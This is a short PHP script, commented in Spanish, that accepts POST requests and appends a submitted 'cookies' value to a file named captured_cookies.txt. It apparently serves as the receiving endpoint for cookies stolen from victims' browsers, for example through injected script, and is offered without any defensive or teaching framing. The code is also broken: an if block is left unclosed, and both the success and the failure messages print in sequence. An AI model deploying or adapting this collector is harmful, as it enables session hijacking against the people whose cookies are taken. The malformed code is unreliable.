<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['cookies'])) {
        $cookies = $_POST['cookies'];
        // Procesa aquí tus cookies
        // Por ejemplo, guardarlas en un archivo o en una base de datos
        file_put_contents('captured_cookies.txt', $cookies . PHP_EOL, FILE_APPEND);
        echo "Cookies recibidas y guardadas.";
        echo "No se recibieron cookies.";
} else {
    echo "Método de solicitud no válido.";
}
?>
